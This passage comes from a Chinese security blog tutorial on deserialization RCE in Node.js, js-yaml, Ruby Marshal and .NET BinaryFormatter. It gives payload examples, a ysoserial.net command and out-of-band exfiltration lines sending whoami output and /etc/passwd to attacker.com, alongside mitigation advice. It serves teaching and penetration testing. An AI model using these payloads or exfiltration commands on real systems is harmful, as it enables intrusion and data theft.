+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">&#x27;node-serialize&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> payload = &#123;</span><br><span class="line">    <span class="attr">rce</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;whoami&#x27;</span>, <span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(stdout);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> serialized = serialize.<span class="title function_">serialize</span>(payload);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(serialized);</span><br><span class="line"><span class="comment">// 输出类似：&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123; ... &#125;&quot;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>在实际利用中，攻击者通常需要在payload末尾添加 <code>()</code> 使其成为IIFE，或者在序列化字符串中直接拼接自执行语法。</p>
+<h3 id="4-2-更危险的反序列化库"><a href="#4-2-更危险的反序列化库" class="headerlink" title="4.2 更危险的反序列化库"></a>4.2 更危险的反序列化库</h3><p>除 <code>node-serialize</code> 外，以下npm包也曾存在反序列化RCE问题：</p>
+<table>
+<thead>
+<tr>
+<th>包名</th>
+<th>危险方法</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>node-serialize</code></td>
+<td><code>unserialize()</code></td>
+<td>使用 <code>eval</code> 执行函数体</td>
+</tr>
+<tr>
+<td><code>serialize-to-js</code></td>
+<td><code>deserialize()</code></td>
+<td>旧版本使用 <code>eval</code></td>
+</tr>
+<tr>
+<td><code>funcster</code></td>
+<td><code>unserialize()</code></td>
+<td>同 <code>node-serialize</code> 原理</td>
+</tr>
+<tr>
+<td><code>js-serialize</code></td>
+<td><code>deserialize()</code></td>
+<td>存在命令注入</td>
+</tr>
+<tr>
+<td><code>serialize-javascript</code></td>
+<td><code>deserialize()</code></td>
+<td>配置不当可RCE</td>
+</tr>
+</tbody></table>
+<h3 id="4-3-js-yaml-反序列化RCE"><a href="#4-3-js-yaml-反序列化RCE" class="headerlink" title="4.3 js-yaml 反序列化RCE"></a>4.3 js-yaml 反序列化RCE</h3><p>与PyYAML类似，Node.js的 <code>js-yaml</code> 库也支持自定义类型反序列化。当 <code>js-yaml</code> 配合自定义 schema 中的 <code>!!js/function</code> 类型时，会直接通过 <code>new Function()</code> 创建并执行函数：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!js/function</span> <span class="string">&gt;</span></span><br><span class="line"><span class="string">  (function() &#123;</span></span><br><span class="line"><span class="string">    require(&#x27;child_process&#x27;).exec(&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="string">  &#125;)()</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> yaml = <span class="built_in">require</span>(<span class="string">&#x27;js-yaml&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 危险：使用UNSAFE_SCHEMA</span></span><br><span class="line"><span class="keyword">const</span> unsafeYaml = yaml.<span class="title function_">load</span>(</span><br><span class="line">    fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;payload.yaml&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>),</span><br><span class="line">    &#123; <span class="attr">schema</span>: yaml.<span class="property">DEFAULT_SCHEMA</span> &#125; <span class="comment">// 注意：DEFAULT_SCHEMA不支持!!js/function</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>实际利用中，攻击者需要目标使用包含 <code>!!js/function</code> 的 schema（如某些自定义配置），或者在应用允许用户上传并加载YAML配置文件时实施攻击。</p>
+<h3 id="4-4-Node-js-防护措施"><a href="#4-4-Node-js-防护措施" class="headerlink" title="4.4 Node.js 防护措施"></a>4.4 Node.js 防护措施</h3><ul>
+<li>禁止使用 <code>eval</code> &#x2F; <code>new Function</code> 处理用户输入</li>
+<li>反序列化操作使用 <code>JSON.parse</code> 替代，JSON不支持函数</li>
+<li>若必须使用YAML，调用 <code>yaml.safeLoad()</code> 或 <code>yaml.load()</code> 配合 <code>schema: yaml.SAFE_SCHEMA</code></li>
+<li>在 <code>package.json</code> 中锁定依赖版本，定期审计 <code>npm audit</code></li>
+</ul>
+<h2 id="五、Ruby-Marshal-load-反序列化"><a href="#五、Ruby-Marshal-load-反序列化" class="headerlink" title="五、Ruby Marshal.load 反序列化"></a>五、Ruby Marshal.load 反序列化</h2><h3 id="5-1-Marshal-简介"><a href="#5-1-Marshal-简介" class="headerlink" title="5.1 Marshal 简介"></a>5.1 Marshal 简介</h3><p>Ruby的 <code>Marshal</code> 模块提供对象的二进制序列化。<code>Marshal.load</code> 将字节流还原为Ruby对象。与Python的pickle类似，Marshal在反序列化过程中也会调用一些特殊的钩子方法。</p>
+<h3 id="5-2-利用链"><a href="#5-2-利用链" class="headerlink" title="5.2 利用链"></a>5.2 利用链</h3><p>Ruby反序列化的关键切入点是 <code>Gem::Specification</code>、<code>Gem::Requirement</code> 等标准库类。这些类在反序列化过程中会调用某些能触发代码执行的方法。配合恶意构造的序列化数据，可形成稳定的利用链（universal gadget chain）。</p>
+<p>主要涉及的魔法方法：</p>
+<ul>
+<li><code>marshal_load</code>：Marshal反序列化后调用</li>
+<li><code>_load</code>：自定义反序列化入口</li>
+<li><code>initialize_copy</code> &#x2F; <code>init_with</code>：对象重建过程中调用</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 经典利用payload结构（概念性示例）</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 marshal_dump 方法来控制序列化数据</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Malicious</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">marshal_load</span>(<span class="params">obj</span>)</span><br><span class="line">    system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实际利用中，攻击者会利用标准库中已有的类来构造利用链</span></span><br><span class="line"><span class="comment"># 而非自定义类（因为目标服务器上没有加载自定义类）</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-3-经典-Gadget-Chain"><a href="#5-3-经典-Gadget-Chain" class="headerlink" title="5.3 经典 Gadget Chain"></a>5.3 经典 Gadget Chain</h3><p>Ruby on Rails应用中较为知名的gadget chain利用链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Marshal.load → Gem::Requirement → Gem::Dependency → ...</span><br><span class="line">→ ERB.new → ERB#result → system command</span><br></pre></td></tr></table></figure>
+
+<p>在实际渗透中，成熟的Ruby Marshal利用工具（如 <code>ysomap</code>、<code>marshalsec</code>）能自动生成针对不同Ruby&#x2F;Rails版本的payload。</p>
+<h3 id="5-4-防护措施"><a href="#5-4-防护措施" class="headerlink" title="5.4 防护措施"></a>5.4 防护措施</h3><ul>
+<li>使用 <code>JSON.parse</code> 或 <code>YAML.safe_load</code> 替代 <code>Marshal.load</code></li>
+<li>若必须使用Marshal，仅反序列化来自可信源的数据</li>
+<li>升级Ruby和Rails版本，修复已知利用链</li>
+</ul>
+<h2 id="六、-NET-BinaryFormatter-反序列化"><a href="#六、-NET-BinaryFormatter-反序列化" class="headerlink" title="六、.NET BinaryFormatter 反序列化"></a>六、.NET BinaryFormatter 反序列化</h2><h3 id="6-1-机制概述"><a href="#6-1-机制概述" class="headerlink" title="6.1 机制概述"></a>6.1 机制概述</h3><p><code>BinaryFormatter</code> 是.NET Framework中最常用的二进制序列化器。它在反序列化时通过读取类型信息并使用反射来重建对象图。这个”类型解析”过程给了攻击者可乘之机：</p>
+<ul>
+<li>攻击者可以在序列化数据中嵌入任意类型信息</li>
+<li>当CLR尝试实例化这些类型时，会触发对象的构造函数和相关回调</li>
+<li>配合特定类（gadget）的方法调用链，形成RCE</li>
+</ul>
+<h3 id="6-2-常见Gadget类型"><a href="#6-2-常见Gadget类型" class="headerlink" title="6.2 常见Gadget类型"></a>6.2 常见Gadget类型</h3><table>
+<thead>
+<tr>
+<th>Gadget类型</th>
+<th>命名空间</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>TextFormattingRunProperties</code></td>
+<td><code>Microsoft.VisualStudio.Text.Formatting</code></td>
+<td>VS文本格式属性，可用于任意文件读取</td>
+</tr>
+<tr>
+<td><code>ObjectDataProvider</code></td>
+<td><code>System.Windows.Data</code></td>
+<td>可调用静态方法（Process.Start）</td>
+</tr>
+<tr>
+<td><code>ActivitySurrogateSelector</code></td>
+<td><code>System.Workflow.ComponentModel</code></td>
+<td>WF工作流组件，可触发任意代码</td>
+</tr>
+<tr>
+<td><code>DataSet</code> &#x2F; <code>DataTable</code></td>
+<td><code>System.Data</code></td>
+<td>数据库反序列化gadget</td>
+</tr>
+<tr>
+<td><code>TypeConfuseDelegate</code></td>
+<td>—</td>
+<td>委托混淆gadget，通用型利用</td>
+</tr>
+</tbody></table>
+<h3 id="6-3-利用示例（ysoserial-net）"><a href="#6-3-利用示例（ysoserial-net）" class="headerlink" title="6.3 利用示例（ysoserial.net）"></a>6.3 利用示例（ysoserial.net）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 ysoserial.net 生成BinaryFormatter payload</span></span><br><span class="line">ysoserial.exe -g ObjectDataProvider -f BinaryFormatter \</span><br><span class="line">  -c <span class="string">&quot;ping attacker.com&quot;</span> -o <span class="built_in">base64</span></span><br></pre></td></tr></table></figure>
+
+<p><code>ysoserial.net</code> 是一个专门针对.NET反序列化的payload生成工具，内置数十种gadget利用链，覆盖从Exchange到SharePoint到ViewState的多种攻击场景。</p>
+<h3 id="6-4-防护措施"><a href="#6-4-防护措施" class="headerlink" title="6.4 防护措施"></a>6.4 防护措施</h3><ul>
+<li><strong>.NET 5+</strong>：<code>BinaryFormatter</code> 已被标记为 <code>[Obsolete]</code> 并计划移除。迁移到 <code>System.Text.Json</code></li>
+<li>使用 <code>SerializationBinder</code> 实现类型白名单</li>
+<li>切勿反序列化不可信来源的二进制数据</li>
+<li>启用 <code>AppDomain.AssemblyResolve</code> 事件的监控</li>
+</ul>
+<h2 id="七、多语言反序列化对比"><a href="#七、多语言反序列化对比" class="headerlink" title="七、多语言反序列化对比"></a>七、多语言反序列化对比</h2><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>Python pickle</th>
+<th>PyYAML</th>
+<th>Node.js node-serialize</th>
+<th>Ruby Marshal</th>
+<th>.NET BinaryFormatter</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>序列化格式</strong></td>
+<td>二进制(opcode)</td>
+<td>文本(YAML)</td>
+<td>文本(JSON-like)</td>
+<td>二进制</td>
+<td>二进制</td>
+</tr>
+<tr>
+<td><strong>触发方法</strong></td>
+<td><code>__reduce__</code> &#x2F; <code>__reduce_ex__</code></td>
+<td><code>!!python/object</code> 标签</td>
+<td><code>eval</code> 执行函数体</td>
+<td><code>marshal_load</code> 回调</td>
+<td>类型解析+反射</td>
+</tr>
+<tr>
+<td><strong>利用复杂度</strong></td>
+<td>低</td>
+<td>低</td>
+<td>低</td>
+<td>中</td>
+<td>中-高</td>
+</tr>
+<tr>
+<td><strong>Gadget需求</strong></td>
+<td>无需（直接构造）</td>
+<td>无需（直接构造）</td>
+<td>无需（直接构造）</td>
+<td>需利用标准库链</td>
+<td>需特定gadget类</td>
+</tr>
+<tr>
+<td><strong>影响范围</strong></td>
+<td>任何使用pickle的应用</td>
+<td>使用yaml.load的应用</td>
+<td>使用node-serialize的应用</td>
+<td>Ruby&#x2F;Rails应用</td>
+<td>.NET Framework应用</td>
+</tr>
+<tr>
+<td><strong>Payload工具</strong></td>
+<td>手工&#x2F;Python脚本</td>
+<td>手工&#x2F;YAML</td>
+<td>Burp Suite&#x2F;手工</td>
+<td>ysomap&#x2F;marshalsec</td>
+<td>ysoserial.net</td>
+</tr>
+<tr>
+<td><strong>默认安全性</strong></td>
+<td>不安全</td>
+<td>3.6+默认安全</td>
+<td>不安全</td>
+<td>不安全</td>
+<td>不安全</td>
+</tr>
+<tr>
+<td><strong>推荐替代</strong></td>
+<td>JSON</td>
+<td>safe_load &#x2F; JSON</td>
+<td>JSON.parse</td>
+<td>JSON.parse</td>
+<td>System.Text.Json</td>
+</tr>
+</tbody></table>
+<h2 id="八、实战利用思路"><a href="#八、实战利用思路" class="headerlink" title="八、实战利用思路"></a>八、实战利用思路</h2><h3 id="8-1-常见攻击入口"><a href="#8-1-常见攻击入口" class="headerlink" title="8.1 常见攻击入口"></a>8.1 常见攻击入口</h3><ul>
+<li><strong>Cookie反序列化</strong>：某些Web框架会将会话对象序列化后存入Cookie，修改Cookie可实现RCE</li>
+<li><strong>API参数</strong>：接受序列化数据的API端点（如<code>/api/import</code>），直接传入payload</li>
+<li><strong>文件上传</strong>：上传包含恶意序列化数据的文件，等待应用解析</li>
+<li><strong>数据库存储</strong>：当应用从数据库中读取并反序列化字段时，先行注入恶意数据</li>
+<li><strong>消息队列</strong>：向目标队列投递恶意的序列化消息</li>
+</ul>
+<h3 id="8-2-无回显利用技巧"><a href="#8-2-无回显利用技巧" class="headerlink" title="8.2 无回显利用技巧"></a>8.2 无回显利用技巧</h3><p>当目标执行命令但无回显时：</p>
+<ul>
+<li><strong>DNS外带</strong>：使用 <code>nslookup $(whoami).attacker.com</code> 将结果编码到DNS查询中</li>
+<li><strong>HTTP外带</strong>：<code>curl http://attacker.com/$(base64 /etc/passwd)</code></li>
+<li><strong>时间盲注</strong>：根据命令执行时长判断结果（如 <code>sleep 5</code>）</li>
+<li><strong>文件写入</strong>：将结果写入Web目录下的静态文件，再通过HTTP访问</li>
+</ul>
+<h3 id="8-3-防御绕过"><a href="#8-3-防御绕过" class="headerlink" title="8.3 防御绕过"></a>8.3 防御绕过</h3><ul>
+<li><strong>WAF绕过</strong>：对payload进行编码、加密、压缩</li>
+<li><strong>类型白名单绕过</strong>：寻找白名单内的可用gadget类</li>
+<li><strong>版本适配</strong>：不同库版本支持的利用链不同，需提前侦察</li>
+</ul>
+<h2 id="九、渗透测试清单"><a href="#九、渗透测试清单" class="headerlink" title="九、渗透测试清单"></a>九、渗透测试清单</h2><p>在对目标应用进行反序列化漏洞测试时，建议按以下清单逐项排查：</p>
+<ol>
+<li>识别应用中接受序列化数据的入口点（Cookie、请求体、文件上传、WebSocket等）</li>
+<li>确认使用的序列化库及版本</li>
+<li>测试序列化数据的格式特征（如pickle以 <code>\x80</code> 开头，Marshal以 <code>\x04\x08</code> 开头）</li>
+<li>尝试使用已知payload进行盲打</li>
+<li>在有回显的测试环境中先验证payload有效性</li>
+<li>结合DNS&#x2F;HTTP外带确认命令执行</li>
+<li>利用成功后评估权限并尝试提权</li>
+</ol>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p><strong>本文仅供安全研究与教学目的使用。</strong> 文章中所描述的技术和方法仅应用于授权的渗透测试和安全评估活动中。任何人不得利用文中技术对未经授权的系统进行攻击。因不当使用本文信息而导致的任何直接或间接后果，作者不承担任何法律责任。</p>
+<p>在从事安全测试和学习之前，请确保：</p>
+<ul>
+<li>您获得了被测系统所有者的书面授权</li>
+<li>您在隔离的、自己搭建的实验环境中进行练习</li>
+<li>您遵守所在地区的法律法规</li>
+<li>您遵循负责任的漏洞披露原则</li>
+</ul>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://docs.python.org/3/library/pickle.html">Python pickle 官方文档</a></li>
+<li><a target="_blank" rel="noopener" href="https://pyyaml.org/wiki/PyYAMLDocumentation">PyYAML 安全警告</a></li>
+<li><a target="_blank" rel="noopener" href="https://snyk.io/blog/general/node-serialize-code-execution/">Node.js node-serialize RCE</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/pwntester/ysoserial.net">ysoserial.net GitHub</a></li>
+<li><a target="_blank" rel="noopener" href="https://ruby-doc.org/core-3.0.0/Marshal.html">Ruby Marshal Security</a></li>
+<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html">OWASP Deserialization Cheat Sheet</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/HTTP-request-smuggling/" rel="prev" title="HTTP请求走私攻击">
+                  <i class="fa fa-angle-left"></i> HTTP请求走私攻击
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Web-cache-poisoning/" rel="next" title="Web缓存投毒攻击">
+                  Web缓存投毒攻击 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
